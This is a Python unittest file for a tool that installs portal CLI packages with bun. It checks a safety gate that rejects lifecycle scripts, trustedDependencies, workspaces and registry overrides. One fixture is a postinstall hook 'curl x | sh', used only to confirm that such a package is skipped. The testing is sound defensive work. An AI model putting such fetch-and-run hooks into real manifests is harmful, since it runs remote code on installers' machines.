"""Tests for tools/install_portal_clis.py - the one-command portal CLI install.

No network and no real `bun install`: discovery and the safety gate run against
a temporary skills tree, the runner is injected, and the end-to-end case uses
--dry-run on the real repo.
"""

import io
import json
import subprocess
import sys
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from tempfile import TemporaryDirectory

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT / "tools"))

from install_portal_clis import discover, unsafe_reason  # noqa: E402
import install_portal_clis  # noqa: E402


def install(*args):
    with redirect_stdout(io.StringIO()):
        return install_portal_clis.install(*args)


class FakeRun:
    def __init__(self, fail=()):
        self.calls = []
        self.fail = set(fail)

    def __call__(self, argv, cwd):
        self.calls.append(Path(cwd).parent.name)
        self.argvs = getattr(self, "argvs", []) + [list(argv)]
        return subprocess.CompletedProcess(argv, 1 if Path(cwd).parent.name in self.fail else 0)


class InstallPortalClis(unittest.TestCase):
    def setUp(self):
        directory = TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        self.root = Path(directory.name)

    def add_cli(self, name, manifest=None):
        cli = self.root / ".agents" / "skills" / name / "cli"
        cli.mkdir(parents=True)
        (cli / "package.json").write_text(json.dumps(manifest or {"name": name}), encoding="utf-8")
        return cli

    def test_discovers_every_cli_on_the_ci_glob(self):
        """A fork-added portal is found without editing any list."""
        self.add_cli("linkedin-search")
        self.add_cli("my-market-search")
        (self.root / ".agents" / "skills" / "no-cli-skill").mkdir(parents=True)
        self.assertEqual([p.parent.name for p in discover(self.root)], ["linkedin-search", "my-market-search"])

    def test_discovery_matches_the_shipped_tree(self):
        shipped = sorted(p.parent.parent.name for p in REPO_ROOT.glob(".agents/skills/*/cli/package.json"))
        self.assertTrue(shipped)
        self.assertEqual([p.parent.name for p in discover()], shipped)

    def test_lifecycle_script_is_skipped_not_run(self):
        self.add_cli("safe-search")
        self.add_cli("borrowed-search", {"scripts": {"postinstall": "curl x | sh"}})
        run = FakeRun()
        self.assertEqual(install(discover(self.root), "bun", False, self.root, run), 1)
        self.assertEqual(run.calls, ["safe-search"])

    def test_trusted_dependencies_is_unsafe(self):
        self.assertIn("trustedDependencies", unsafe_reason(self.add_cli("x", {"trustedDependencies": ["y"]})))

    # GHSA-wq7j-x5jq-pjrw: the gate read only the top-level manifest, but a
    # `workspaces` entry pulls in sub-packages with their own lifecycle scripts
    # (a workspace postinstall ran under Bun 1.3.10), and a bunfig.toml beside
    # the manifest reconfigures the install itself (registry, scopes, cache).
    def test_workspaces_is_unsafe(self):
        self.assertIn("workspaces", unsafe_reason(self.add_cli("x", {"workspaces": ["packages/*"]})))

    def test_bunfig_is_unsafe(self):
        cli = self.add_cli("x")
        (cli / "bunfig.toml").write_text('[install]\nregistry = "https://registry.example"\n', encoding="utf-8")
        self.assertIn("bunfig.toml", unsafe_reason(cli))

    def test_npmrc_is_unsafe(self):
        # Bun reads .npmrc too: a registry line beside the manifest fetches
        # every dependency from a server the portal's author picked.
        cli = self.add_cli("x")
        (cli / ".npmrc").write_text("registry=https://registry.example/\n", encoding="utf-8")
        self.assertIn(".npmrc", unsafe_reason(cli))

    def test_bun_install_never_runs_lifecycle_scripts(self):
        # #718: --ignore-scripts on every install, so a dependency's hook stays
        # off whatever the Bun release's default trust list says.
        self.add_cli("a-search")
        run = FakeRun()
        self.assertEqual(install(discover(self.root), "bun", False, self.root, run), 0)
        self.assertEqual(run.argvs, [["bun", "install", "--ignore-scripts"]])

    def test_one_failure_does_not_stop_the_rest(self):
        for name in ("a-search", "b-search", "c-search"):
            self.add_cli(name)
        run = FakeRun(fail={"b-search"})
        self.assertEqual(install(discover(self.root), "bun", False, self.root, run), 1)
        self.assertEqual(run.calls, ["a-search", "b-search", "c-search"])

    def test_dry_run_runs_nothing(self):
        self.add_cli("a-search")
        run = FakeRun()
        self.assertEqual(install(discover(self.root), "bun", True, self.root, run), 0)
        self.assertEqual(run.calls, [])

    def test_cli_dry_run_lists_every_shipped_portal(self):
        proc = subprocess.run(
            [sys.executable, str(REPO_ROOT / "tools" / "install_portal_clis.py"), "--dry-run"],
            capture_output=True, text=True, encoding="utf-8",
        )
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        for cli in discover():
            self.assertIn(f"would install  {cli.parent.name}", proc.stdout)


if __name__ == "__main__":
    unittest.main()
